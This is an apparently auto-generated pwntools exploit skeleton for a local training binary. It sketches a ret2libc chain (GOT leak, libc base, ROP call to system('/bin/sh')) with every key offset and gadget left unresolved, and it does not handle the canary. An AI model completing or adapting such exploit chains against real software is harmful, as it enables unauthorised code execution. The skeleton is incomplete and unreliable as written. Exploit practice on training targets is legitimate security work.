"""PwnCraft 自动生成 EXP 骨架 — 确定性事实渲染，必须人工复核后使用。

strategy    : ret2libc（ret2libc（GOT 泄漏 → libc 基址 → system））  status=blocked
target      : F:\pwn宝\pwncraft\artifacts\gw-training\intelpwn\challenge_fmtstr_canary  sha256=92699ae5bddecbf9…  amd64/64-bit  endian=little
mitigations : PIE=OFF NX=ON CANARY=ON RELRO=PARTIAL FORTIFY=OFF
provenance  : DERIVED（ELF 字节 / objdump / 重定位；离线、无模型推断）
evidence    :
  - printf@plt=0x401090
  - printf@got=0x404010
gaps        :
  - 控制流劫持偏移未证明（需要崩溃/调试证据）
  - libc 文件未提供或符号未解析（system/puts/str_bin_sh）
  - pop rdi 控制 gadget 未从 gadget shelf 证明
unresolved  :
  - OFFSET（到保存返回地址的填充长度）
  - PUTS_LIBC（libc puts 偏移）
  - SYSTEM_LIBC（libc system 偏移）
  - BINSH_LIBC（libc /bin/sh 偏移）
  - POP_RDI（gadget shelf 未证明）
"""
from pwn import *

TARGET = 'F:\\pwn宝\\pwncraft\\artifacts\\gw-training\\intelpwn\\challenge_fmtstr_canary'
context.binary = elf = ELF(TARGET, checksec=False)
context.log_level = "info"

OFFSET = 0x0            # UNRESOLVED: cyclic / 调试器确认的填充长度
RET = 0x40101a
PUTS_LIBC = 0x0            # UNRESOLVED: libc puts 偏移
PUTS_GOT = 0x403fd8
SYSTEM_LIBC = 0x0            # UNRESOLVED: libc system 偏移
BINSH_LIBC = 0x0            # UNRESOLVED: libc /bin/sh 偏移
POP_RDI = 0x0            # UNRESOLVED: pop rdi; ret gadget

UNRESOLVED = ['OFFSET（到保存返回地址的填充长度）', 'PUTS_LIBC（libc puts 偏移）', 'SYSTEM_LIBC（libc system 偏移）', 'BINSH_LIBC（libc /bin/sh 偏移）', 'POP_RDI（gadget shelf 未证明）']

def exploit():
    if UNRESOLVED:
        raise SystemExit("补齐 UNRESOLVED 常量后再运行: " + ", ".join(UNRESOLVED))
    io = process(TARGET)
    # 阶段 1：泄漏 libc 基址
    io.recvuntil(b'')  # TODO: 对齐真实回显
    leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    libc_base = leak - PUTS_LIBC
    log.success(f'libc base = {libc_base:#x}')

    # 阶段 2：函数指针替换为 system('/bin/sh')
    io.sendline(b'')  # TODO: 重新进入输入点
    payload = flat({OFFSET: [p64(RET), p64(POP_RDI), p64(libc_base + BINSH_LIBC), p64(libc_base + SYSTEM_LIBC)]})
    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    exploit()
